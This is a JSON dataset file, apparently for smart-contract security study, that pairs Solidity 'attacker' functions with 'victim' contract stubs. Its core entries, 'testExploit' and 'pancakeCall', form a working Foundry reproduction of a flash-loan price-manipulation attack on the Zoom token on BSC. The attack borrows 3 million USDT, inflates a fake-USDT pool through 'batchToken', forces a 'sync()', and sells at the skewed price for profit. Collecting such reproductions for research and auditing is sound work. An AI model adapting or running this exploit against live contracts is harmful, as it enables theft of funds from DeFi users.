[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {\n        uint256 ba = Usdt.balanceOf(address(this));\n        Usdt.approve(swap, 100_000_000_000_000_000_000_000_000_000_000_000_000);\n\n        // use usdt to swap zoom\n        IUSD(swap).buy(ba);\n        emit log_named_decimal_uint(\"Zoom balance of attacker:\", Zoom.balanceOf(address(this)), 18);\n\n        address[] memory n1 = new address[](1);\n        n1[0] = pp;\n        uint256[] memory n2 = new uint256[](1);\n        n2[0] = 1_000_000 ether;\n        emit log_named_decimal_uint(\n            \"Before manipulate price, Fake USDT balance of pair:\", IERC20(fUSDT).balanceOf(address(pp)), 18\n        );\n        emit log_named_decimal_uint(\"Before manipulate price, Zoom balance of pair:\", Zoom.balanceOf(address(pp)), 18);\n        IUSD(batch).batchToken(n1, n2, fUSDT);\n\n        emit log_named_decimal_uint(\n            \"After manipulate price, Fake USDT balance of pair:\", IERC20(fUSDT).balanceOf(address(pp)), 18\n        );\n        emit log_named_decimal_uint(\"After manipulate price, Zoom balance of pair:\", Zoom.balanceOf(address(pp)), 18);\n\n        // calling pair Fake USDT-Zoom sync() to update latest price\n        IUSD(pp).sync();\n\n        uint256 baz = Zoom.balanceOf(address(this));\n        Zoom.approve(swap, baz * 100);\n        IUSD(swap).sell(baz);\n\n        emit log_named_decimal_uint(\"After selling Zoom, USDT balance of attacker:\", Usdt.balanceOf(address(this)), 18);\n        //Repay flashloan\n        Usdt.transfer(address(PancakePair), (ba * 10_030) / 10_000);\n\n        uint256 U = Usdt.balanceOf(address(this));\n        IERC20(usdt).transfer(address(this), U);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21_055_930); //fork bsc at block number 21055930\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[Start] Attacker WBNB balance before exploit\", Usdt.balanceOf(address(this)), 18);\n\n        // flashloan - Brrow 3,000,000 USDT\n        PancakePair.swap(3_000_000_000_000_000_000_000_000, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] After repay, Profit: USDT balance of attacker\", Usdt.balanceOf(address(this)), 18\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUSD",
    "source_type": "victim_contract",
    "function_name": "batchToken",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUSD",
    "source_type": "victim_contract",
    "function_name": "buy",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUSD",
    "source_type": "victim_contract",
    "function_name": "getReserves",
    "original_code": "    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n        _reserve0 = reserve0;\n        _reserve1 = reserve1;\n        _blockTimestampLast = blockTimestampLast;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IUSD",
    "source_type": "victim_contract",
    "function_name": "sell",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUSD",
    "source_type": "victim_contract",
    "function_name": "swapTokensForExactTokens",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IUSD",
    "source_type": "victim_contract",
    "function_name": "sync",
    "original_code": "    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n",
    "description": ""
  }
]